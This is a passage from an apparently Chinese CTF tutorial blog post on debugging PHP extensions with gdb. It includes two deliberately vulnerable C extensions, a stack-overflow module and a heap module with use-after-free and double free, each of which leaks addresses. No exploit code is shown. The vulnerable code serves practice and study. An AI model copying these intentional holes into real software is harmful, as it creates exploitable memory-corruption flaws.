          <a href="#1-查找模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-查找模块" class="headerlink" title="1.查找模块"></a>1.查找模块</h2>
      <p>查找php拓展模块</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep extensions</span><br><span class="line">php -i | grep -i extension_dir</span><br></pre></td></tr></table></div></figure>


        <h2 id="2-开始调试"   >
          <a href="#2-开始调试" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-开始调试" class="headerlink" title="2.开始调试"></a>2.开始调试</h2>
      <p>如下，调试php程序，然后跑起来，使得加载进入拓展模块，ctrl+c中断后即可对特定函数下断点，然后再跑<code>test.php</code>，该php调用需要调试的拓展模块中的函数，继续运行即可断点。</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb /www/server/php/73/bin/php</span><br><span class="line">r</span><br><span class="line">(ctrl+c中断)</span><br><span class="line">b zif_funcName</span><br><span class="line">r test.php</span><br><span class="line">c</span><br></pre></td></tr></table></div></figure>

<p>这里可以看到我们使用拓展模块注册的函数最终都会以<code>zif_</code>整个前缀进行修饰，所以当做CTF题时，直接搜索zif从中寻找函数进行解析即可。</p>
<p>如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202202111117225.png" alt="image-20220211111702925"></p>

        <h2 id="🔺测试用例"   >
          <a href="#🔺测试用例" class="heading-link"><i class="fas fa-link"></i></a><a href="#🔺测试用例" class="headerlink" title="🔺测试用例"></a>🔺测试用例</h2>
      
        <h3 id="1-栈模块"   >
          <a href="#1-栈模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-栈模块" class="headerlink" title="(1)栈模块"></a>(1)栈模块</h3>
      <p>传入任意长度的字符串，拷贝给data，导致栈溢出</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_stack extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_stack.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> gift_data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_Stack Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;gift_data,&amp;<span class="built_in">printf</span>,&amp;zif_my_stack_gift);</span><br><span class="line">			RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_stack_func)</span><br><span class="line">        &#123;</span><br><span class="line">        	</span><br><span class="line">        	<span class="keyword">char</span>* buf = <span class="string">&quot;stackTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> buf_len = <span class="keyword">sizeof</span>(<span class="string">&quot;stackTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">        	ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">            Z_PARAM_STRING(buf, buf_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">			<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	php_printf(<span class="string">&quot;Welcome to my Stack!\n&quot;</span>);</span><br><span class="line">        	php_printf(<span class="string">&quot;		   --PIG-007\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        	php_printf(<span class="string">&quot;Gift_Stack:0x%lx\n&quot;</span>,&amp;data);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_Libc:0x%lx\n&quot;</span>,&amp;<span class="built_in">printf</span>);</span><br><span class="line">		    php_printf(<span class="string">&quot;Gift_ELF:0x%lx\n&quot;</span>,&amp;zif_my_stack_func);</span><br><span class="line"></span><br><span class="line">        	<span class="built_in">memcpy</span>(data,buf,buf_len);</span><br><span class="line">        	php_printf(<span class="string">&quot;Over!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_STACK)</span></span><br><span class="line">	ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_stack)</span><br><span class="line">&#123;</span><br><span class="line">	php_info_print_table_start();</span><br><span class="line">	php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_stack support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">	php_info_print_table_end();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_stack_func, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, data)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_stack_functions[] = &#123;</span><br><span class="line">	PHP_FE(my_stack_gift,		arginfo_my_stack_gift)</span><br><span class="line">	PHP_FE(my_stack_func,		arginfo_my_stack_func)</span><br><span class="line">	PHP_FE_END</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_stack_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">zend_module_entry my_stack_module_entry = &#123;</span><br><span class="line">	STANDARD_MODULE_HEADER,</span><br><span class="line">	<span class="string">&quot;my_stack&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">	my_stack_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_MSHUTDOWN - Module shutdown */</span></span><br><span class="line">	PHP_RINIT(my_stack),			<span class="comment">/* PHP_RINIT - Request initialization */</span></span><br><span class="line">	<span class="literal">NULL</span>,							<span class="comment">/* PHP_RSHUTDOWN - Request shutdown */</span></span><br><span class="line">	PHP_MINFO(my_stack),			<span class="comment">/* PHP_MINFO - Module info */</span></span><br><span class="line">	PHP_MY_STACK_VERSION,		<span class="comment">/* Version */</span></span><br><span class="line">	STANDARD_MODULE_PROPERTIES</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> COMPILE_DL_MY_STACK</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> ZTS</span></span><br><span class="line">ZEND_TSRMLS_CACHE_DEFINE()</span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">ZEND_GET_MODULE(my_stack)</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br></pre></td></tr></table></div></figure>




        <h3 id="2-堆模块"   >
          <a href="#2-堆模块" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-堆模块" class="headerlink" title="(2)堆模块"></a>(2)堆模块</h3>
      <p>UAF，溢出，doubleFree等漏洞</p>
<p>测试代码，如下即为用php7.3编译的代码，实现四个函数，增删改查</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">my_heap_addFunc(18);</span><br><span class="line">my_heap_delFunc(0);</span><br><span class="line">my_heap_editFunc(0,&#x27;aaa&#x27;);</span><br><span class="line">my_heap_getFunc(0);</span><br></pre></td></tr></table></div></figure>

<p>题目代码：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* my_heap extension for PHP */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> HAVE_CONFIG_H</span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&quot;config.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;ext/standard/info.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;php_my_heap.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* For compatibility with older PHP versions */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> ZEND_PARSE_PARAMETERS_NONE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ZEND_PARSE_PARAMETERS_NONE() \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_START(0, 0) \</span></span><br><span class="line"><span class="meta">	ZEND_PARSE_PARAMETERS_END()</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span>* notelist[<span class="number">1000</span>];</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_gift)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">char</span> data[<span class="number">0x10</span>];</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_NONE();</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Gift function!---000\n&quot;</span>);</span><br><span class="line">		    retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Gift_Stack:0x%lx\nGift_Libc:0x%lx\nGift_ELF:0x%lx\n&quot;</span>,&amp;data,&amp;<span class="built_in">printf</span>,&amp;zif_my_heap_gift);</span><br><span class="line">RETURN_STR(retval);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_addFunc)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="keyword">long</span> size = <span class="number">10</span>;</span><br><span class="line">                <span class="keyword">char</span>* chunk = <span class="literal">NULL</span>;</span><br><span class="line">                <span class="comment">//zend_string *retval;</span></span><br><span class="line">                php_printf(<span class="string">&quot;PHP_HEAP Add function!---001\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">                ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">                Z_PARAM_LONG(size)</span><br><span class="line">                ZEND_PARSE_PARAMETERS_END();</span><br><span class="line">                chunk = _emalloc(size);</span><br><span class="line">                php_printf(<span class="string">&quot;chunk_addr:0x%lx\n&quot;</span>, chunk);</span><br><span class="line">                <span class="comment">//retval = strpprintf(0, &quot;chunk_addr:0x%lx&quot;, chunk);</span></span><br><span class="line">                <span class="keyword">if</span> (!chunk)</span><br><span class="line">                &#123;</span><br><span class="line">                    php_printf(<span class="string">&quot;Alloca Error\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//HELLO_G(greeting) ++;</span></span><br><span class="line">                notelist[count] = chunk;</span><br><span class="line">                chunk = <span class="literal">NULL</span>;</span><br><span class="line">                count ++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_delFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Free function!---002\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                _efree(notelist[idx]);</span><br><span class="line">                <span class="comment">//notelist[noteChunk-&gt;idx] = NULL;</span></span><br><span class="line">                php_printf(<span class="string">&quot;Free Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_editFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	<span class="keyword">char</span>* data = <span class="string">&quot;editTest&quot;</span>;</span><br><span class="line">        	<span class="keyword">size_t</span> data_len = <span class="keyword">sizeof</span>(<span class="string">&quot;editTest&quot;</span>) - <span class="number">1</span>;</span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Edit function!---003\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            Z_PARAM_STRING(data, data_len)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (notelist[idx])</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(notelist[idx],data,data_len);</span><br><span class="line">                php_printf(<span class="string">&quot;Edit Success!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                php_printf(<span class="string">&quot;You can&#x27;t free it!There is no chunk!\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PHP_FUNCTION(my_heap_getFunc)</span><br><span class="line">        &#123;</span><br><span class="line">        	<span class="keyword">long</span> idx = <span class="number">0</span>;</span><br><span class="line">        	zend_string *retval;</span><br><span class="line">            ZEND_PARSE_PARAMETERS_START(<span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">            Z_PARAM_LONG(idx)</span><br><span class="line">            ZEND_PARSE_PARAMETERS_END();</span><br><span class="line"></span><br><span class="line">            php_printf(<span class="string">&quot;PHP_HEAP Show function!---004\n&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(notelist[idx])&#123;</span><br><span class="line">            	retval = strpprintf(<span class="number">0</span>, <span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Content:%s\n&quot;</span>,notelist[idx]);</span><br><span class="line">                php_printf(<span class="string">&quot;Show Success!\n&quot;</span>);</span><br><span class="line">                RETURN_STR(retval);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125;*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_RINIT_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_RINIT_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(ZTS) &amp;&amp; defined(COMPILE_DL_MY_HEAP)</span></span><br><span class="line">                ZEND_TSRMLS_CACHE_UPDATE();</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> SUCCESS;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; PHP_MINFO_FUNCTION</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PHP_MINFO_FUNCTION(my_heap)</span><br><span class="line">        &#123;</span><br><span class="line">        php_info_print_table_start();</span><br><span class="line">        php_info_print_table_header(<span class="number">2</span>, <span class="string">&quot;my_heap support&quot;</span>, <span class="string">&quot;enabled&quot;</span>);</span><br><span class="line">        php_info_print_table_end();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; arginfo</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_gift, <span class="number">0</span>)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_addFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, addSize)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_editFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editIdx)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, editData)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_delFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, delIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line">ZEND_BEGIN_ARG_INFO(arginfo_my_heap_getFunc, <span class="number">0</span>)</span><br><span class="line">ZEND_ARG_INFO(<span class="number">0</span>, showIdx)</span><br><span class="line">ZEND_END_ARG_INFO()</span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_functions[]</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">const</span> zend_function_entry my_heap_functions[] = &#123;</span><br><span class="line">        		PHP_FE(my_heap_gift,		arginfo_my_heap_gift)</span><br><span class="line">                PHP_FE(my_heap_addFunc,		arginfo_my_heap_addFunc)</span><br><span class="line">                PHP_FE(my_heap_delFunc,		arginfo_my_heap_delFunc)</span><br><span class="line">                PHP_FE(my_heap_editFunc,		arginfo_my_heap_editFunc)</span><br><span class="line">                PHP_FE(my_heap_getFunc,		arginfo_my_heap_getFunc)</span><br><span class="line">                PHP_FE_END</span><br><span class="line">        &#125;;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* &#123;&#123;&#123; my_heap_module_entry</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">        zend_module_entry my_heap_module_entry = &#123;</span><br><span class="line">                STANDARD_MODULE_HEADER,</span><br><span class="line">                <span class="string">&quot;my_heap&quot;</span>,					<span class="comment">/* Extension name */</span></span><br><span class="line">                my_heap_functions,			<span class="comment">/* zend_function_entry */</span></span><br><span class="line">                <span class="literal">NULL</span>,							<span class="comment">/* PHP_MINIT - Module initialization 